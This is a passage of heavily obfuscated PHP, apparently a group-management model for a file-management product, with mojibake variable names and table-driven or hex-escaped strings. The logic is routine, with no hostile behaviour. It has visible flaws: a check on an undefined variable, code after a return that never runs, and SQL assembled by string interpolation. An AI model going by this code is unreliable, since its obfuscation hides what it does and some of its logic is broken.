strpos($Äñ…ÑÚÛ[$¸İ¬˜Ãò[595]], $Â÷š¨²[$¸İ¬˜Ãò[595]] . $Â÷š¨²[$¸İ¬˜Ãò[1975]] . $¸İ¬˜Ãò[50]) === 0) { return !1; } $¿ÂüÇ‘‚[$¸İ¬˜Ãò[666]] = $Äñ…ÑÚÛ[$¸İ¬˜Ãò[595]] . $¿ÂüÇ‘‚[$¸İ¬˜Ãò[192]] . $¸İ¬˜Ãò[50]; $this->_changeChildLevel($Â÷š¨², $Äñ…ÑÚÛ); $this->_clearCache($Äñ…ÑÚÛ[$¸İ¬˜Ãò[1975]]); $this->_clearCache($Â÷š¨²[$¸İ¬˜Ãò[192]]); } } if (isset($¿ÂüÇ‘‚[$¸İ¬˜Ãò[32]])) { $this->setNamePinyin($¬×çò–ù, $¿ÂüÇ‘‚[$¸İ¬˜Ãò[32]]); } if (isset($¿ÂüÇ‘‚[$¸İ¬˜Ãò[2065]])) { $this->metaSet($¬×çò–ù, array($¸İ¬˜Ãò[2065] => $¿ÂüÇ‘‚[$¸İ¬˜Ãò[2065]], $¸İ¬˜Ãò[2066] => $¿ÂüÇ‘‚[$¸İ¬˜Ãò[2066]])); unset($¿ÂüÇ‘‚[$¸İ¬˜Ãò[2065]]); unset($¿ÂüÇ‘‚[$¸İ¬˜Ãò[2066]]); } $this->_clearChildrenCache($Â÷š¨²); return $this->where(array($¸İ¬˜Ãò[2067] => $¬×çò–ù))->save($¿ÂüÇ‘‚); } private function _clearChildrenCache($«­©•Õ) { $ËÀÄ®ıÕ =& $_SERVER[±³—úê]; $‰’áó»ú = array($ËÀÄ®ıÕ[666] => array($ËÀÄ®ıÕ[626], $«­©•Õ[$ËÀÄ®ıÕ[595]] . $«­©•Õ[$ËÀÄ®ıÕ[1975]] . $ËÀÄ®ıÕ[627])); $ØÅ‰µ¡ = $this->field($ËÀÄ®ıÕ[1975])->where($‰’áó»ú)->select(); foreach ($ØÅ‰µ¡ as $îç÷øş) { $this->_clearCache($îç÷øş[$ËÀÄ®ıÕ[1975]]); } } private function _clearCache($‡„Æ¨Ë‘) { $Í­š·…± =& $_SERVER[±³—úê]; $this->cacheFunctionClear($Í­š·…±[2061], $‡„Æ¨Ë‘); $this->cacheFunctionClear($Í­š·…±[2062], $‡„Æ¨Ë‘); } private function _changeChildLevel($ï®­—¬, $ÅĞ˜, $‡¤ë¯Õ´ = false) { $°âçùı =& $_SERVER[±³—úê]; $»Ã“¥Ïõ = $ï®­—¬[$°âçùı[595]] . $ï®­—¬[$°âçùı[1975]] . $°âçùı[50]; $Ø’¤ÏÚË = $ÅĞ˜[$°âçùı[595]] . $ÅĞ˜[$°âçùı[1975]] . $°âçùı[50] . $ï®­—¬[$°âçùı[1975]] . $°âçùı[50]; if ($‡¤ë¯Õ´) { $Ø’¤ÏÚË = $ÅĞ˜[$°âçùı[595]] . $ÅĞ˜[$°âçùı[1975]] . $°âçùı[50]; } $¨ˆ€Ğ¬– = array($°âçùı[666] => array($°âçùı[626], $ï®­—¬[$°âçùı[595]] . $ï®­—¬[$°âçùı[1975]] . $°âçùı[627])); $îí³û‚é = array($°âçùı[666] => array($°âçùı[675], "\x72\145\x70\x6c\x61\143\x65\50\x70\x61\x72\145\156\164\x4c\145\x76\x65\x6c\x2c\47{$»Ã“¥Ïõ}\47\54\x27{$Ø’¤ÏÚË}\x27\x29")); $this->_clearChildrenCache($ï®­—¬); $this->where($¨ˆ€Ğ¬–)->data($îí³û‚é)->save(); } public function setNamePinyin($ßßĞÄö†, $›û»´ºØ = false) { $Şà†æ¦Â =& $_SERVER[±³—úê]; if (!$›û»´ºØ) { $´…Åæì = $this->getInfoSimple($ßßĞÄö†); $›û»´ºØ = $´…Åæì[$Şà†æ¦Â[32]]; } if (!Input::check($›û»´ºØ, $Şà†æ¦Â[669])) { $this->metaSet($ßßĞÄö†, $Şà†æ¦Â[549], null); $this->metaSet($ßßĞÄö†, $Şà†æ¦Â[548], null); return; } $é ãìúß = array($Şà†æ¦Â[549] => str_replace($Şà†æ¦Â[53], $Şà†æ¦Â[12], Pinyin::get($›û»´ºØ)), $Şà†æ¦Â[548] => Pinyin::get($›û»´ºØ, $Şà†æ¦Â[670])); $this->metaSet($ßßĞÄö†, $é ãìúß); } protected function metaSet($ÙÕÏÓ•ı, $¤¶àÇÍŸ = null, $İ¥õ…ßš = null) { $this->_clearCache($ÙÕÏÓ•ı); return parent::metaSet($ÙÕÏÓ•ı, $¤¶àÇÍŸ, $İ¥õ…ßš); } protected function groupStatus($òÕ‘àœñ, $¦§ıîÆ‹) { $·•¹ÉÎ =& $_SERVER[±³—úê]; $ ¿ô•®Û = $this->getInfoSimple($òÕ‘àœñ); if (!$ ¿ô•®Û) { return !1; } $this->_clearCache($òÕ‘àœñ); return $this->metaSet($òÕ‘àœñ, $·•¹ÉÎ[830], $¦§ıîÆ‹); if ($¦§ıîÆ‹ == $·•¹ÉÎ[91]) { $Ñä™‚”ë = $this->parentLevelArray($ ¿ô•®Û[$·•¹ÉÎ[595]]); } else { } $Ñä™‚”ë[] = $ ¿ô•®Û[$·•¹ÉÎ[1975]]; $Ì ÷üÛµ = array(); foreach ($Ñä™‚”ë as $òÕ‘àœñ) { $Ì ÷üÛµ[] = array($·•¹ÉÎ[1975] => $òÕ‘àœñ, $·•¹ÉÎ[97] => $·•¹ÉÎ[830], $·•¹ÉÎ[461] => $¦§ıîÆ‹); $this->_clearCache($òÕ‘àœñ); } return Model($·•¹ÉÎ[2068])->addAll($Ì ÷üÛµ, array(), !0); } protected function groupRemove($üº´ç¸İ, $—×¦Ê¹¸ = false) { $ü´êĞ—¡ =& $_SERVER[±³—úê]; $‚–¿ØùÆ = array($ü´êĞ—¡[1975] => $üº´ç¸İ); $¯ı÷®¬ä = $this->where($‚–¿ØùÆ)->find(); if (!$¯ı÷®¬ä || $¯ı÷®¬ä[$ü´êĞ—¡[192]] == 0) { return !1; } if (!$—×¦Ê¹¸) { $°À›•½å = $this->getInfoSimple($¯ı÷®¬ä[$ü´êĞ—¡[192]]); $this->_changeChildLevel($¯ı÷®¬ä, $°À›•½å, !0); $this->where(array($ü´êĞ—¡[192] => $üº´ç¸İ))->save(array($ü´êĞ—¡[192] => $¯ı÷®¬ä[$ü´êĞ—¡[192]])); $this->_clearCache($°À›•½å[$ü´êĞ—¡[1975]]); } Model($ü´êĞ—¡[2068])->where($‚–¿ØùÆ)->delete(); Model($ü´êĞ—¡[2069])->where($‚–¿ØùÆ)->delete(); Model($ü´êĞ—¡[905])->groupRootRemove($üº´ç¸İ); $this->_clearCache($¯ı÷®¬ä[$ü´êĞ—¡[192]]); return $this->where($‚–¿ØùÆ)->delete(); } protected function groupSort($Ûí¼“ê) { $œÎöÑèÓ =& $_SERVER[±³—úê]; $·îÊ„üƒ = array(); foreach ($Ûí¼“ê as $ÄÏ¡Ô÷¡ => $ÇÈ¥óÕ) { $·îÊ„üƒ[] = array($œÎöÑèÓ[1975], $ÇÈ¥óÕ, $œÎöÑèÓ[1999], $ÄÏ¡Ô÷¡ + 1); } $this->saveAll($·îÊ„üƒ); } public function listData() { $©ß‘˜°Ó = $this->_makeOrder()->selectPage(50); $this->_listDataApply($©ß‘˜°Ó[$_SERVER[±³—úê][456]]); return $©ß‘˜°Ó; } private function _makeOrder($ƒæó¿ò² = '') { $•«š§‰Ğ =& $_SERVER[±³—úê]; $Èªø…Ü = array($•«š§‰Ğ[1975], $•«š§‰Ğ[32], $•«š§‰Ğ[1963], $•«š§‰Ğ[243]); $šşä®Ôş = array($•«š§‰Ğ[534] => $•«š§‰Ğ[535], $•«š§‰Ğ[536] => $•«š§‰Ğ[537]); $©Öâ·¡ª = Input::get($•«š§‰Ğ[541], $•«š§‰Ğ[7], $•«š§‰Ğ[1979], $Èªø…Ü); $ĞÊ‘°© = Input::get($•«š§‰Ğ[542], $•«š§‰Ğ[7], $•«š§‰Ğ[2070], array($•«š§‰Ğ[2070], $•«š§‰Ğ[536])); $ĞÊ‘°© = $šşä®Ôş[$ĞÊ‘°©]; $ƒæó¿ò² = $ƒæó¿ò² . "{$©Öâ·¡ª}\x20{$ĞÊ‘°©}\x2c\x20\x67\x72\157\165\160\111\x44\x20\141\163\143"; return $this->order($ƒæó¿ò²); } public function listChild($¹ïÍßÅÓ) { $µ¹¨Éœ› =& $_SERVER[±³—úê]; $¹«ÀÊè = $this->where(array($µ¹¨Éœ›[192] => $¹ïÍßÅÓ))->_makeOrder()->selectPage(200); $this->_listDataApply($¹«ÀÊè[$µ¹¨Éœ›[456]]); return $¹«ÀÊè; } public function listChildIds($¯¼ÅÏ¶) { $­òÃë·Ä =& $_SERVER[±³—úê]; if (is_string($‚“»¡ùÁ)) { $¯¼ÅÏ¶ = explode($­òÃë·Ä[50], $¯¼ÅÏ¶); } $İğü¥ô× = $this->where(array($­òÃë·Ä[1975] => array($­òÃë·Ä[7], $¯¼ÅÏ¶)))->field($­òÃë·Ä[2071])->select(); if (!$İğü¥ô×) { return !1; } $µş¢·›Ğ = array(); foreach ($İğü¥ô× as $ÓíÎ¬¶Ê) { $µş¢·›Ğ[] = "\x73\145\x6c\x65\143\164\x20\x67\162\x6f\165\160\x49\104\x20\x66\162\x6f\x6d\40\x60\x67\x72\x6f\165\x70\140\x20\167\150\145\162\145\x20\160\x61\x72\145\156\x74\114\x65\166\145\x6c\x20\154\151\x6b\x65\x20\47{$ÓíÎ¬¶Ê[$­òÃë·Ä[595]]}{$ÓíÎ¬¶Ê[$­òÃë·Ä[1975]]}\54\x25\47"; } $µş¢·›Ğ = implode($­òÃë·Ä[2072], $µş¢·›Ğ); $İğü¥ô× = $this->query($µş¢·›Ğ); if (!$İğü¥ô×) { return array(); } $¯¼ÅÏ¶ = array_to_keyvalue($İğü¥ô×, $­òÃë·Ä[12], $­òÃë·Ä[1975]); return array_unique($¯¼ÅÏ¶); } public function listByID($µ‘¥Ñôî) { $í¾Á„ =& $_SERVER[±³—úê]; if (!$µ‘¥Ñôî) { return array(); } $Šïòµ¢ã = array($í¾Á„[1975] => array($í¾Á„[7], $µ‘¥Ñôî)); $÷øµî­ = $this->where($Šïòµ¢ã)->select(); $÷øµî­ = array_sort_keep($÷øµî­, $í¾Á„[1975], $µ‘¥Ñôî); $this->_listDataApply($÷øµî­); return $÷øµî­; } public function listSearch($ê¾Çèµ÷) { $„ôò¦Ğû =& $_SERVER[±³—úê]; $•¡´«İ = trim($ê¾Çèµ÷[$„ôò¦Ğû[2073]]); $œ¬ààµ› = explode($„ôò¦Ğû[53], $•¡´«İ); if (!$•¡´«İ || count($œ¬ààµ›) == 1) { return $this->listSearchNow($ê¾Çèµ÷); } $Å¢ş÷á¬ = array($„ôò¦Ğû[456] => array()); foreach ($œ¬ààµ› as $ûæè’) { if (!trim($ûæè’)) { continue; } $ê¾Çèµ÷[$„ôò¦Ğû[2073]] = $ûæè’; $«¹’²ú¬ = $this->listSearchNow($ê¾Çèµ÷); $Å¢ş÷á¬[$„ôò¦Ğû[456]] = array_merge($Å¢ş÷á¬[$„ôò¦Ğû[456]], $«¹’²ú¬[$„ôò¦Ğû[456]]); } $Å¢ş÷á¬[$„ôò¦Ğû[456]] = array_unique_by_key($Å¢ş÷á¬[$„ôò¦Ğû[456]], $„ôò¦Ğû[1975]); $Å¢ş÷á¬[$„ôò¦Ğû[453]] = array($„ôò¦Ğû[454] => count($Å¢ş÷á¬[$„ôò¦Ğû[456]]), $„ôò¦Ğû[450] => 20, $„ôò¦Ğû[439] => 1, $„ôò¦Ğû[455] => 1); return $Å¢ş÷á¬; } public function listSearchNow($çëŒŠ¿­) { $÷íÆ´ =& $_SERVER[±³—úê]; $ğ˜ôÉ = trim($çëŒŠ¿­[$÷íÆ´[2073]]); $©–­…Ÿ¯ = isset($çëŒŠ¿­[$÷íÆ´[2074]]) ? $çëŒŠ¿­[$÷íÆ´[2074]] : !1; if (!trim($ğ˜ôÉ)) { return !1; } $ğ˜ôÉ = str_replace($÷íÆ´[2075], $÷íÆ´[2076], $ğ˜ôÉ); $ò¹ò—•ï = array($÷íÆ´[1975] => array($÷íÆ´[470], "{$ğ˜ôÉ}\x25"), $÷íÆ´[32] => array($÷íÆ´[470], "\45{$ğ˜ôÉ}\45"), $÷íÆ´[1079] => $÷íÆ´[2077]); if ($©–­…Ÿ¯) { $Ëã¬Ï›é = $this->getInfoSimple($©–­…Ÿ¯); $Ú˜”³â§ = $Ëã¬Ï›é[$÷íÆ´[595]] . $©–­…Ÿ¯ . $÷íÆ´[627]; $ò¹ò—•ï = array($ò¹ò—•ï, array($÷íÆ´[595] => array($÷íÆ´[470], $Ú˜”³â§))); } $ò¹ò—•ï = $this->parseWhereLike($ò¹ò—•ï); $» ¬˜•œ = $this->_makeOrder()->where($ò¹ò—•ï)->selectPage(20); $» ¬˜•œ = $» ¬˜•œ ? $» ¬˜•œ : array($÷íÆ´[456] => array(), $÷íÆ´[453] => array()); if (!$» ¬˜•œ || count($» ¬˜•œ[$÷íÆ´[456]]) < 5 && Input::check($ğ˜ôÉ, $÷íÆ´[404])) { $²‡Öì†Œ = $this->groupChildrenAll($©–­…Ÿ¯); $âóù»¯© = $this->_searchFromMeta($÷íÆ´[548], $ğ˜ôÉ, 10, $²‡Öì†Œ); $®ÃŸÂÅ = $this->_searchFromMeta($÷íÆ´[549], $ğ˜ôÉ, 10, $²‡Öì†Œ); $ì˜©— = array_merge($âóù»¯©, $®ÃŸÂÅ, $» ¬˜•œ[$÷íÆ´[456]]); $» ¬˜•œ[$÷íÆ´[456]] = array_unique_by_key($ì˜©—, $÷íÆ´[1975]); $» ¬˜•œ[$÷íÆ´[453]][$÷íÆ´[454]] = count($» ¬˜•œ[$÷íÆ´[456]]); $» ¬˜•œ[$÷íÆ´[453]][$÷íÆ´[455]] = ceil($» ¬˜•œ[$÷íÆ´[453]][$÷íÆ´[454]] / $» ¬˜•œ[$÷íÆ´[453]][$÷íÆ´[450]]); } $this->_listDataApply($» ¬˜•œ[$÷íÆ´[456]]); return $» ¬˜•œ; } protected function groupChildrenAll($§­ğÊïÆ) { $Š¿ƒÁ•ù =& $_SERVER[±³—úê]; if (!$§­ğÊïÆ) { return !1; } if (!is_array($§­ğÊïÆ)) { $§­ğÊïÆ = array($§­ğÊïÆ); } $¹´ƒ“ã = $§­ğÊïÆ; foreach ($§­ğÊïÆ as $…Å•¸çå) { $Î˜ùÉò‹ = $this->getInfoSimple($…Å•¸çå); $´šµûÆÓ = array($Š¿ƒÁ•ù[595] => array($Š¿ƒÁ•ù[470], $Î˜ùÉò‹[$Š¿ƒÁ•ù[595]] . $…Å•¸çå . $Š¿ƒÁ•ù[627])); $ûÒıïı§ = $this->field($Š¿ƒÁ•ù[1975])->where($´šµûÆÓ)->select(); $¹´ƒ“ã = array_merge($¹´ƒ“ã, array_to_keyvalue($ûÒıïı§, $Š¿ƒÁ•ù[12], $Š¿ƒÁ•ù[1975])); } return array_unique($¹´ƒ“ã); } private function _searchFromMeta($Ñ†üùÁÇ, $Øú°²øå, $È®ÀÅ‘, $ò‹†Â–Ş) { $”åî’Ğ¨ =& $_SERVER[±³—úê]; $Øú°²øå = strtolower($Øú°²øå); $Êêèöê¦ = array($”åî’Ğ¨[97] => $Ñ†üùÁÇ, $”åî’Ğ¨[461] => array($”åî’Ğ¨[470], "\x25{$Øú°²øå}\x25")); $Êêèöê¦ = $this->parseWhereLike($Êêèöê¦); if ($ò‹†Â–Ş) { $Êêèöê¦[$”åî’Ğ¨[1975]] = array($”åî’Ğ¨[7], $ò‹†Â–Ş); } $ÚµÉù–† = Model($”åî’Ğ¨[2078])->where($Êêèöê¦)->limit($È®ÀÅ‘)->select(); if (!$ÚµÉù–†) { return array(); } $ÚµÉù–† = array_to_keyvalue($ÚµÉù–†, $”åî’Ğ¨[12], $”åî’Ğ¨[1975]); $ÖÌÇšî£ = $this->where(array($”åî’Ğ¨[2067] => array($”åî’Ğ¨[7], $ÚµÉù–†)))->select(); if (!$ÖÌÇšî£) { return array(); } return $ÖÌÇšî£; } protected function _listDataApplyItem($÷ÊŠ¨óû) { $šøôúÃ = array($÷ÊŠ¨óû); $this->_listDataApply($šøôúÃ); return $šøôúÃ[0]; } protected function _listDataApply(&$í‡…×‹ã) { $½¿–¿áì =& $_SERVER[±³—úê]; if (!$í‡…×‹ã) { return; } $äàïâ = array_to_keyvalue($í‡…×‹ã, $½¿–¿áì[12], $½¿–¿áì[1975]); $this->_listAppendChildren($í‡…×‹ã); $this->_listAppendChildrenMember($í‡…×‹ã); $this->_listAppendMeta($í‡…×‹ã, $äàïâ); $this->_listAppendParent($í‡…×‹ã); $this->_listAppendSourceRoot($í‡…×‹ã, $äàïâ); } private function _listAppendChildren(&$‰·¯»“Ö) { $ ìÂŞ‹ï =& $_SERVER[±³—úê]; $›Ôâ±²“ = array_to_keyvalue($‰·¯»“Ö, $ ìÂŞ‹ï[12], $ ìÂŞ‹ï[1975]); $¸²÷Ø—Ã = array($ ìÂŞ‹ï[192] => array($ ìÂŞ‹ï[7], $›Ôâ±²“)); $Úçûâ¥ = array($ ìÂŞ‹ï[192], $ ìÂŞ‹ï[2079] => $ ìÂŞ‹ï[576]); $ó˜ôì²Ô = $this->field($Úçûâ¥)->where($¸²÷Ø—Ã)->group($ ìÂŞ‹ï[192])->select(); $Îæ¼§Õˆ = array_to_keyvalue($ó˜ôì²Ô, $ ìÂŞ‹ï[192], $ ìÂŞ‹ï[576]); foreach ($‰·¯»“Ö as &$¿¯¹Õ‰Ó) { $çÀ»½£ç = $¿¯¹Õ‰Ó[$ ìÂŞ‹ï[1975]]; $¿¯¹Õ‰Ó[$ ìÂŞ‹ï[2080]] = isset($Îæ¼§Õˆ[$çÀ»½£ç]) ? intval($Îæ¼§Õˆ[$çÀ»½£ç]) : !1; } unset($¿¯¹Õ‰Ó); } private function _listAppendChildrenMember(&$àÂö¤”ø) { $¥è¬Ğ¨Ï =& $_SERVER[±³—úê]; $À¹¡¿ˆ­ = array_to_keyvalue($àÂö¤”ø, $¥è¬Ğ¨Ï[12], $¥è¬Ğ¨Ï[1975]); $’‚Ùìœà = array($¥è¬Ğ¨Ï[1975] => array($¥è¬Ğ¨Ï[7], $À¹¡¿ˆ­)); $İÍ¯¹ò• = array($¥è¬Ğ¨Ï[1975], $¥è¬Ğ¨Ï[2079] => $¥è¬Ğ¨Ï[576]); $Ù“ùÍàÜ = Model($¥è¬Ğ¨Ï[2069])->field($İÍ¯¹ò•)->where($’‚Ùìœà)->group($¥è¬Ğ¨Ï[1975])->select(); $¦¹ƒ¿Á = array_to_keyvalue($Ù“ùÍàÜ, $¥è¬Ğ¨Ï[1975], $¥è¬Ğ¨Ï[576]); foreach ($àÂö¤”ø as &$½‰”™Áá) { $ä´˜ÍÙë = $½‰”™Áá[$¥è¬Ğ¨Ï[1975]]; $½‰”™Áá[$¥è¬Ğ¨Ï[2081]] = isset($¦¹ƒ¿Á[$ä´˜ÍÙë]) ? intval($¦¹ƒ¿Á[$ä´˜ÍÙë]) : !1; } unset($½‰”™Áá); } private function _listAppendMeta(&$¤²¢Ùñ¸, $éÜ‰ğ¦) { $ÖÕïŸ·¾ =& $_SERVER[±³—úê]; $±íê»ü = array($ÖÕïŸ·¾[1975] => array($ÖÕïŸ·¾[7], $éÜ‰ğ¦)); $‰¬©œ„ = Model($ÖÕïŸ·¾[2068])->where($±íê»ü)->select(); $‰¬©œ„ = array_to_keyvalue_group($‰¬©œ„, $ÖÕïŸ·¾[1975]); foreach ($‰¬©œ„ as &$äüŸöŠœ) { $äüŸöŠœ = array_to_keyvalue($äüŸöŠœ, $ÖÕïŸ·¾[97], $ÖÕïŸ·¾[461]); } unset($äüŸöŠœ); foreach ($¤²¢Ùñ¸ as &$ïª°öÒ‹) { $ïª°öÒ‹[$ÖÕïŸ·¾[550]] = array(); if (isset($‰¬©œ„[$ïª°öÒ‹[$ÖÕïŸ·¾[1975]]])) { $ïª°öÒ‹[$ÖÕïŸ·¾[550]] = $‰¬©œ„[$ïª°öÒ‹[$ÖÕïŸ·¾[1975]]]; } } unset($ïª°öÒ‹); } protected function parentLevelArray($ã»â©¹’) { $¸Áñîş™ =& $_SERVER[±³—úê]; $ã»â©¹’ = explode($¸Áñîş™[50], trim($ã»â©¹’, $¸Áñîş™[50])); $ã»â©¹’ = array_remove_value($ã»â©¹’, $¸Áñîş™[240]); return $ã»â©¹’; } protected function parentInGroup($ö®‚Ä‘ş, $î÷”Ûûß) { $ñ§ØÎî¤ =& $_SERVER[±³—úê]; $‘³»ó† = $this->getInfoSimple($ö®‚Ä‘ş); if (!$‘³»ó†) { return !0; } $ĞáæŞŒÏ = $this->parentLevelArray($‘³»ó†[$ñ§ØÎî¤[595]]); $ĞáæŞŒÏ[] = $ö®‚Ä‘ş; foreach ($ĞáæŞŒÏ as $ö®‚Ä‘ş) { if (in_array($ö®‚Ä‘ş . $ñ§ØÎî¤[12], $î÷”Ûûß)) { return !0; } } return !1; } private function _listAppendParent(&$æÊİ½¬Ş) { $áŞî¤£ =& $_SERVER[±³—úê]; $±‚ÀÆ°ı = array(); foreach ($æÊİ½¬Ş as &$í›‘å‚ü) { $±‚ÀÆ°ı[$í›‘å‚ü[$áŞî¤£[1975]]] = $í›‘å‚ü[$áŞî¤£[32]]; $©‹¦Şî = $this->parentLevelArray($í›‘å‚ü[$áŞî¤£[595]]); foreach ($©‹¦Şî as $¼’°‚Ô´) { if (!isset($±‚ÀÆ°ı[$¼’°‚Ô´])) { $±‚ÀÆ°ı[$¼’°‚Ô´] = 0; } } } unset($í›‘å‚ü); foreach ($±‚ÀÆ°ı as $¾¼¶½­É => $á„¶ó») { if ($á„¶ó») { continue; } $£ìãëÏ = $this->getInfoSimple($¾¼¶½­É); $±‚ÀÆ°ı[$¾¼¶½­É] = $£ìãëÏ[$áŞî¤£[32]]; } $Ìğ—˜‘Ê = $GLOBALS[$áŞî¤£[6]][$áŞî¤£[92]][$áŞî¤£[2082]]; if (KodUser::isRoot()) { $Ìğ—˜‘Ê = !1; } foreach ($æÊİ½¬Ş as &$í›‘å‚ü) { $©‹¦Şî = $this->parentLevelArray($í›‘å‚ü[$áŞî¤£[595]]); $¬¸„øô¥ = $áŞî¤£[12]; foreach ($©‹¦Şî as $¾¼¶½­É => $¼’°‚Ô´) { if ($Ìğ—˜‘Ê && $¾¼¶½­É == 0) { continue; } $¬¸„øô¥ .= $±‚ÀÆ°ı[$¼’°‚Ô´] . $áŞî¤£[8]; } if ($©‹¦Şî) { $¬¸„øô¥ .= $í›‘å‚ü[$áŞî¤£[32]]; } $í›‘å‚ü[$áŞî¤£[600]] = str_replace($áŞî¤£[266], $áŞî¤£[8], $¬¸„øô¥); } unset($í›‘å‚ü); } private function _listAppendSourceRoot(&$‰¶İé, $‡ù„Ñé) { $Ôë¯Ë™ =& $_SERVER[±³—úê]; $³«¦•§™ = Model($Ôë¯Ë™[905])->listSourceRoot(SourceModel::TYPE_GROUP, $‡ù„Ñé); $³«¦•§™ = array_to_keyvalue($³«¦•§™, $Ôë¯Ë™[580]); $³«¦•§™ = array_remove_key($³«¦•§™, $Ôë¯Ë™[580]); foreach ($‰¶İé as &$†ØÇ§§½) { $†ØÇ§§½[$Ôë¯Ë™[90]] = $³«¦•§™[$†ØÇ§§½[$Ôë¯Ë™[1975]]] ? $³«¦•§™[$†ØÇ§§½[$Ôë¯Ë™[1975]]] : array(); } unset($†ØÇ§§½); } protected function groupMerge($è‚ä­ªÖ) { $è‚ä­ªÖ = array_values(array_unique($è‚ä­ªÖ)); $ãğõ¦´ó = array(); for ($æş²¨¸¨ = 0; $æş²¨¸¨ < count($è‚ä­ªÖ); $æş²¨¸¨++) { $åè·æº = !1; for ($§™Ùƒ¸ = 0; $§™Ùƒ¸ < count($è‚ä­ªÖ); $§™Ùƒ¸++) { if ($æş²¨¸¨ == $§™Ùƒ¸) { continue; } if ($this->isParentOf($è‚ä­ªÖ[$§™Ùƒ¸], $è‚ä­ªÖ[$æş²¨¸¨])) { $åè·æº = !0; break; } } if (!$åè·æº) { $ãğõ¦´ó[] = $è‚ä­ªÖ[$æş²¨¸¨]; } } return $ãğõ¦´ó; } protected function isParentOf($¸¨×ù¾‹, $‘ıß‡Ÿ¿) { $ëÌ¦¿íĞ =& $_SERVER[±³—úê]; if (!$¸¨×ù¾‹ || !$‘ıß‡Ÿ¿ || $¸¨×ù¾‹ == $‘ıß‡Ÿ¿) { return !1; } $¦ÕÆ‰®¼ = $this->getInfoSimple($¸¨×ù¾‹); $™ğÒñ¶ = $this->getInfoSimple($‘ıß‡Ÿ¿); $µúêæÓË = $¦ÕÆ‰®¼[$ëÌ¦¿íĞ[595]] . $¸¨×ù¾‹ . $ëÌ¦¿íĞ[50]; if (substr($™ğÒñ¶[$ëÌ¦¿íĞ[595]], 0, strlen($µúêæÓË)) == $µúêæÓË) { return !0; } return !1; } public function groupShowRoot($Çñ‹²öó, $˜ñ§¯¨ü = false) { $™ı’ ƒ =& $_SERVER[±³—úê]; $´™ô•ù = $this->getInfo($Çñ‹²öó); if (!$´™ô•ù) { return array(); } $ùÛúÄµß = $this->parentLevelArray($´™ô•ù[$™ı’ ƒ[595]]); $Öã’Î«ä = array($Çñ‹²öó); if (count($ùÛúÄµß) == 0) { return $Öã’Î«ä; } if ($˜ñ§¯¨ü && count($ùÛúÄµß) == 1) { return $Öã’Î«ä; } if (!$´™ô•ù[$™ı’ ƒ[550]] || !isset($´™ô•ù[$™ı’ ƒ[550]][$™ı’ ƒ[2065]]) || $´™ô•ù[$™ı’ ƒ[550]][$™ı’ ƒ[2065]] == $™ı’ ƒ[856]) { return $this->groupShowRoot($ùÛúÄµß[count($ùÛúÄµß) - 1], $˜ñ§¯¨ü); } if ($´™ô•ù[$™ı’ ƒ[550]][$™ı’ ƒ[2065]] == $™ı’ ƒ[443]) { $èáÊËñ = explode($™ı’ ƒ[50], $´™ô•ù[$™ı’ ƒ[550]][$™ı’ ƒ[2066]]); if ($èáÊËñ) { $Öã’Î«ä = array_merge($Öã’Î«ä, $èáÊËñ); } } return $Öã’Î«ä; } protected function resetParentLevel() { $‹áöî¥Ÿ =& $_SERVER[±³—úê]; $ü¹«—Ô = $‹áöî¥Ÿ[1975]; $Ä¤ëª¦ = $this->select(); $Ä¤ëª¦ = array_to_keyvalue($Ä¤ëª¦, $ü¹«—Ô); foreach ($Ä¤ëª¦ as $Ú£Úå×®) { $’€¼¹â = $Ú£Úå×®; $ú±‹¯ã¢ = array(); while ($’€¼¹â[$‹áöî¥Ÿ[192]] != 0) { $ú±‹¯ã¢[] = $’€¼¹â[$‹áöî¥Ÿ[192]]; $’€¼¹â = $Ä¤ëª¦[$’€¼¹â[$‹áöî¥Ÿ[192]]]; } $ú±‹¯ã¢[] = 0; $ú±‹¯ã¢ = $‹áöî¥Ÿ[50] . implode($‹áöî¥Ÿ[50], array_reverse($ú±‹¯ã¢)) . $‹áöî¥Ÿ[50]; $this->setNamePinyin($Ú£Úå×®[$ü¹«—Ô], $Ú£Úå×®[$‹áöî¥Ÿ[32]]); $this->where(array($ü¹«—Ô => $Ú£Úå×®[$ü¹«—Ô]))->save(array($‹áöî¥Ÿ[666] => $ú±‹¯ã¢)); } return $Ä¤ëª¦; } public function groupNameAuto($ö–Â®¸ø, $æ£æŸ) { $ÄéÛšÒ… =& $_SERVER[±³—úê]; $“¶×à˜œ = $this->where(array($ÄéÛšÒ…[488] => $ö–Â®¸ø))->getField($ÄéÛšÒ…[32], !0); if (!$“¶×à˜œ || !in_array($æ£æŸ, $“¶×à˜œ)) { return $æ£æŸ; } for ($§„šÇú = 1; $§„šÇú <= count($“¶×à˜œ) + 1; $§„šÇú++) { $ğ¿¡§í× = $æ£æŸ . "\50{$§„šÇú}\51"; if (!in_array($ğ¿¡§í×, $“¶×à˜œ)) { return $ğ¿¡§í×; } } } public function groupSwitch($‹¾ĞÅ¦Ù, $åœ•ïÃ) { $¹õÕ¼• =& $_SERVER[±³—úê]; $‘ë Å­ó = array($¹õÕ¼•[1975] => array($¹õÕ¼•[7], array($‹¾ĞÅ¦Ù, $åœ•ïÃ))); $ÖÏ“ñºó = $this->where($‘ë Å­ó)->select(); $ÖÏ“ñºó = array_to_keyvalue($ÖÏ“ñºó, $¹õÕ¼•[1975]); if (!isset($ÖÏ“ñºó[$‹¾ĞÅ¦Ù]) || !isset($ÖÏ“ñºó[$åœ•ïÃ]) || $ÖÏ“ñºó[$‹¾ĞÅ¦Ù][$¹õÕ¼•[192]] == 0) { return !1; } $‘ë Å­ó = array($¹õÕ¼•[1975] => $‹¾ĞÅ¦Ù); $»ÕĞ”¨Ï = Model($¹õÕ¼•[2069])->where($‘ë Å­ó)->select(); if (!$»ÕĞ”¨Ï) { $»ÕĞ”¨Ï = array(); } foreach ($»ÕĞ”¨Ï as $ÇÖ‚±ˆ) { $ÇÆ¿Í” = $ÇÖ‚±ˆ[$¹õÕ¼•[1775]]; $‘ë Å­ó = array($¹õÕ¼•[1775] => $ÇÆ¿Í”, $¹õÕ¼•[1975] => $åœ•ïÃ); $Ø…ŠÒ†á = Model($¹õÕ¼•[2069])->where($‘ë Å­ó)->find(); if (!$Ø…ŠÒ†á) { $£ö¦ÓàÁ = array($åœ•ïÃ => $ÇÖ‚±ˆ[$¹õÕ¼•[2083]]); Model($¹õÕ¼•[608])->userGroupAdd($ÇÆ¿Í”, $£ö¦ÓàÁ); } Model($¹õÕ¼•[608])->userGroupRemove($ÇÆ¿Í”, $‹¾ĞÅ¦Ù); } $‘ë Å­ó = array($¹õÕ¼•[190] => 2, $¹õÕ¼•[192] => 0, $¹õÕ¼•[496] => 1, $¹õÕ¼•[580] => array($¹õÕ¼•[7], array($‹¾ĞÅ¦Ù, 